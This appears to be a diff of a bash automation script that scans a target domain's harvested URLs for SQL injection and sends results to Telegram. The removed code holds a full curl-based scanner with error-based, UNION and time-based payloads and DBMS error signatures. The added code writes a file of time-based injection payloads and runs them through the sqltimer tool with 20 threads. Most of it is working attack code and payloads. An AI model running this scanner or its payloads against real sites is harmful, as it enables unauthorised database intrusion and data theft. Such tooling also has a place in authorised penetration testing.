@@ -163,173 +163,60 @@ run_gf_patterns() {
 
 # SQL injection testing
 test_sqli() {
-    echo -e "\n${BLUE}[+] Testing for SQL Injection vulnerabilities...${NC}"
+    echo -e "\n${BLUE}[+] Testing for SQL injection vulnerabilities...${NC}"
     
-    # Ensure the SQL pattern file exists and create results directory
-    if [[ ! -f "$domain/result/gf/sqli.txt" ]]; then
-        echo -e "${RED}[!] SQL pattern file not found!${NC}"
+    # Check if sqltimer is installed
+    if ! command -v sqltimer &> /dev/null; then
+        echo -e "${RED}[!] sqltimer not found. Please install it first.${NC}"
+        echo -e "${YELLOW}[*] You can install it with: go install github.com/c0dejump/sqltimer@latest${NC}"
         return 1
     fi
-    mkdir -p "$domain/result/sqli"
     
-    total_urls=$(wc -l < "$domain/result/gf/sqli.txt")
-    current=0
-    vulnerable=0
-    
-    # SQL injection payloads
-    declare -a payloads=(
-        "%27"                   # Single quote
-        "%22"                   # Double quote
-        "%60"                   # Backtick
-        "'OR'1'='1"            # Basic OR injection
-        "'+OR+1=1--"           # OR injection with comment
-        "'+UNION+SELECT+NULL--" # UNION SELECT injection
-        "'+AND+1=1--"          # AND injection
-        "'+AND+SLEEP(5)--"     # Time-based injection
-        "'+WAITFOR+DELAY+'0:0:5'--" # Time-based for MSSQL
-        "'+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT(0x3a,0x3a,(SELECT+@@version),0x3a,0x3a,FLOOR(RAND(0)*2))a+FROM+information_schema.tables+GROUP+BY+a)b)--" # Error-based injection
-    )
-    
-    # Error patterns to detect SQL injection - More specific patterns to reduce false positives
-    declare -a error_patterns=(
-        "mysql_fetch_array()"
-        "You have an error in your SQL syntax"
-        "ORA-00933: SQL command not properly ended"
-        "PostgreSQL ERROR:"
-        "Microsoft SQL Native Client error"
-        "Warning: mssql_query()"
-        "Microsoft OLE DB Provider for ODBC Drivers error"
-        "SQLITE_ERROR"
-        "[Microsoft][ODBC SQL Server Driver]"
-        "org.postgresql.util.PSQLException"
-        "java.sql.SQLException"
-        "System.Data.SqlClient.SqlException"
-        "Unclosed quotation mark after the character string"
-    )
-    
-    while IFS= read -r url; do
-        ((current++))
-        echo -e "\n${YELLOW}[*] Testing URL ($current/$total_urls)${NC}"
-        
-        for payload in "${payloads[@]}"; do
-            test_url="${url}${payload}"
-            
-            # Test GET request
-            start_time=$(date +%s.%N)
-            response=$(curl -s -L --max-time 15 -H "User-Agent: Mozilla/5.0" "$test_url")
-            end_time=$(date +%s.%N)
-            duration=$(echo "$end_time - $start_time" | bc)
-            
-            # Double verification for error-based injection
-            error_count=0
-            for pattern in "${error_patterns[@]}"; do
-                if echo "$response" | grep -qi "$pattern"; then
-                    ((error_count++))
-                    if [ $error_count -ge 2 ]; then  # Require at least 2 error patterns for confirmation
-                        echo -e "\n${RED}[!] Confirmed SQL Injection Vulnerability${NC}"
-                        echo -e "${RED}[!] Vulnerable URL: ${test_url}${NC}"
-                        echo "$test_url" >> "$domain/result/sqli/error_based.txt"
-                        ((vulnerable++))
-                        break 2  # Break both loops once confirmed
-                    fi
-                fi
-            done
-            
-            # Strict time-based injection check with multiple attempts
-            if (( $(echo "$duration > 4.9" | bc -l) )); then
-                # Verify with a second request
-                start_time2=$(date +%s.%N)
-                curl -s -L --max-time 15 -H "User-Agent: Mozilla/5.0" "$test_url" > /dev/null
-                end_time2=$(date +%s.%N)
-                duration2=$(echo "$end_time2 - $start_time2" | bc)
-                
-                if (( $(echo "$duration2 > 4.9" | bc -l) )); then
-                    echo -e "\n${RED}[!] Confirmed Time-based SQL Injection${NC}"
-                    echo -e "${RED}[!] Vulnerable URL: ${test_url}${NC}"
-                    echo "$test_url" >> "$domain/result/sqli/time_based.txt"
-                    ((vulnerable++))
-                    break  # Move to next URL after finding vulnerability
-                fi
-            fi
-            
-            # Test POST request if URL has parameters
-            if [[ "$url" == *"="* ]]; then
-                params=$(echo "$url" | grep -o '[^?]*$')
-                base_url=$(echo "$url" | sed 's/?.*//')
-                post_data="${params}${payload}"
-                
-                post_response=$(curl -s -L --max-time 15 -X POST \
-                    -H "Content-Type: application/x-www-form-urlencoded" \
-                    -H "User-Agent: Mozilla/5.0" \
-                    -d "$post_data" "$base_url")
-                
-                # Double verification for POST-based injection
-                error_count=0
-                for pattern in "${error_patterns[@]}"; do
-                    if echo "$post_response" | grep -qi "$pattern"; then
-                        ((error_count++))
-                        if [ $error_count -ge 2 ]; then
-                            echo -e "\n${RED}[!] Confirmed POST SQL Injection${NC}"
-                            echo -e "${RED}[!] Vulnerable URL: ${base_url}${NC}"
-                            echo -e "${RED}[!] POST Data: ${post_data}${NC}"
-                            echo "${base_url} [POST] ${post_data}" >> "$domain/result/sqli/post_vulnerable.txt"
-                            ((vulnerable++))
-                            break 2
-                        fi
-                    fi
-                done
-            fi
-        done
-    done < "$domain/result/gf/sqli.txt"
-    
-    # Display only confirmed vulnerabilities
-    echo -e "\n${BLUE}[*] Confirmed SQL Injection Vulnerabilities:${NC}"
-    
-    if [ -f "$domain/result/sqli/error_based.txt" ] && [ -s "$domain/result/sqli/error_based.txt" ]; then
-        echo -e "\n${RED}[!] Error-based Vulnerabilities:${NC}"
-        cat "$domain/result/sqli/error_based.txt"
+    # Check if SQL injection patterns file exists
+    if [[ ! -f "$workspace/result/gf/sqli.txt" ]] || [[ ! -s "$workspace/result/gf/sqli.txt" ]]; then
+        echo -e "${RED}[!] No SQL injection patterns found to test${NC}"
+        return 1
     fi
     
-    if [ -f "$domain/result/sqli/time_based.txt" ] && [ -s "$domain/result/sqli/time_based.txt" ]; then
-        echo -e "\n${RED}[!] Time-based Vulnerabilities:${NC}"
-        cat "$domain/result/sqli/time_based.txt"
+    # Check for payloads file
+    payloads_file="payloads.txt"
+    if [[ ! -f "$payloads_file" ]]; then
+        echo -e "${YELLOW}[!] Payloads file not found at $payloads_file${NC}"
+        echo -e "${BLUE}[*] Creating basic payloads file...${NC}"
+        cat > "$payloads_file" << 'EOF'
+1') AND SLEEP({SLEEP}) AND ('1'='1
+(select*from(select(sleep({SLEEP})))a)
+(SELECT*SLEEP({SLEEP}))
+SLEEP({SLEEP})
+1337ANDSLEEP({SLEEP})
+'AND(CASEWHEN(SUBSTRING(version(),1,1)='P')THEN(SELECT4564FROMPG_SLEEP({SLEEP}))ELSE4564END)=4564--
+';WAITFORDELAY'00:00:{SLEEP}'--
+';IF(1=1)WAITFORDELAY'00:00:{SLEEP}'--
+'||DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP})--
+'XOR(IF(NOW()=SYSDATE(),SLEEP({SLEEP}),0))XOR'Z
+'OR1=(SELECTCASEWHEN(1=1)THENPG_SLEEP({SLEEP})ELSENULLEND)--
+EOF
     fi
     
-    if [ -f "$domain/result/sqli/post_vulnerable.txt" ] && [ -s "$domain/result/sqli/post_vulnerable.txt" ]; then
-        echo -e "\n${RED}[!] POST Vulnerabilities:${NC}"
-        cat "$domain/result/sqli/post_vulnerable.txt"
-    fi
+    # Count total URLs to test
+    total_urls=$(wc -l < "$workspace/result/gf/sqli.txt")
+    echo -e "${MAGENTA}[*] Testing $total_urls potential SQL injection endpoints...${NC}"
     
-    echo -e "\n${GREEN}[✓] Total confirmed vulnerabilities: $vulnerable${NC}"
-    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-}
-# Generate summary report
-generate_report() {
-    echo -e "\n${BLUE}[+] Generating summary report...${NC}"
+    # Run SQL injection testing
+    cat "$workspace/result/gf/sqli.txt" | sqltimer -payloads "$payloads_file" -sleep 10 -threads 20 -encode 2>/dev/null | tee "$workspace/result/sqli/vulnerable.txt"
     
-    report_file="$workspace/result/sqli/summary_report.txt"
-    
-    {
-        echo "SQL Injection Vulnerability Scan Report"
-        echo "====================================="
-        echo "Date: $(date)"
-        echo "Target Domain: $domain"
-        echo ""
-        echo "Scan Statistics:"
-        echo "---------------"
-        echo "Total URLs Scanned: $(wc -l < "$workspace/result/gf/sqli.txt" 2>/dev/null || echo "0")"
-        echo "Vulnerable Endpoints: $(wc -l < "$workspace/result/sqli/vulnerable.txt" 2>/dev/null || echo "0")"
-        echo ""
-        echo "Findings:"
-        echo "---------"
-        if [[ -f "$workspace/result/sqli/vulnerable.txt" ]]; then
-            cat "$workspace/result/sqli/vulnerable.txt"
+    # Check results
+    if [[ -f "$workspace/result/sqli/vulnerable.txt" ]]; then
+        vuln_count=$(grep -c "VULNERABLE" "$workspace/result/sqli/vulnerable.txt" 2>/dev/null || echo "0")
+        if [[ $vuln_count -gt 0 ]]; then
+            echo -e "${RED}[!] Found $vuln_count potential SQL injection vulnerabilities!${NC}"
         else
-            echo "No vulnerabilities found"
+            echo -e "${GREEN}[✓] No SQL injection vulnerabilities detected${NC}"
         fi
-    } > "$report_file"
+    else
+        echo -e "${YELLOW}[!] No results generated${NC}"
+    fi
     
-    echo -e "${GREEN}[✓] Report generated: $report_file${NC}"
     echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 }
 
@@ -381,7 +268,6 @@ main() {
     validate_urls
     run_gf_patterns
     test_sqli
-    generate_report
     send_to_telegram
     echo -e "\n${GREEN}[✓] SQL Injection scan completed successfully!${NC}\n"
 }
